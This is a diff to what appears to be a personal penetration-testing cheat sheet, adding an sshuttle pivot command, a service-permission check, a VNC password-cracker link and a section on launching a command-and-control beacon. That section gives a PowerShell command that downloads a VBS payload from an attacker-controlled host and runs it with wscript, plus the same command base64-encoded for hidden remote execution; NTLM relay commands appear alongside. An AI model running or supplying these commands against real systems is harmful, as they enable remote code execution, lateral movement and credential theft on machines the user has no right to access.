@@ -61,6 +61,9 @@ ad-ldap-enum.py -l 10.10.10.10 -d domain.local
 [escape rbash]
 ssh user@10.10.10.51 sh
 
+[sshutle]
+sshuttle -vr sshuser@10.10.110.74 192.168.20.0/24
+
 [autosolve crypto]
 https://scwf.dima.ninja/
 
@@ -713,7 +716,7 @@ dig any @192.168.0.102 webmaster.htb
 # check service permission to the user
 accesschk.exe /accepteula -uwcqv user <service>
 # check service with unquoted path
-accesschk.exe /accepteula -ucqv user
+accesschk.exe /accepteula -ucqv user unquotedsvc
 # check writable path
 accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
 
@@ -778,3 +781,14 @@ https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1
 Responder -I tun0 -rdvw
 * Create a targets.txt containing list of targets ip (i.e. all://10.10.10.10)
 ntlmrelayx.py -tf targets.txt -sm3support
+
+[beacon: vbs script]
+* Generate VBS script on CS
+* generate this command and encode with utf-16le
+echo "Invoke-WebRequest -Uri 'http://10.10.14.3:8000/apt.vbs' -OutFile 'C:\Windows\Tasks\apt.vbs';wscript.exe C:\Windows\Tasks\apt.vbs" | iconv utf-16le | base64
+* run in remote
+powershell.exe -nop -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAzADoAOAAwADAAMAAvAGEAcAB0AC4AdgBiAHMAJwAgAC0ATwB1AHQARgBpAGwAZQAgACcAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAYQBzAGsAcwBcAGEAcAB0AC4AdgBiAHMAJwA7AHcAcwBjAHIAaQBwAHQALgBlAHgAZQAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXABhAHAAdAAuAHYAYgBzAA==
+
+[vnc crack]
+https://github.com/jeroennijhof/vncpwd
+vncpwd <vnc password file>
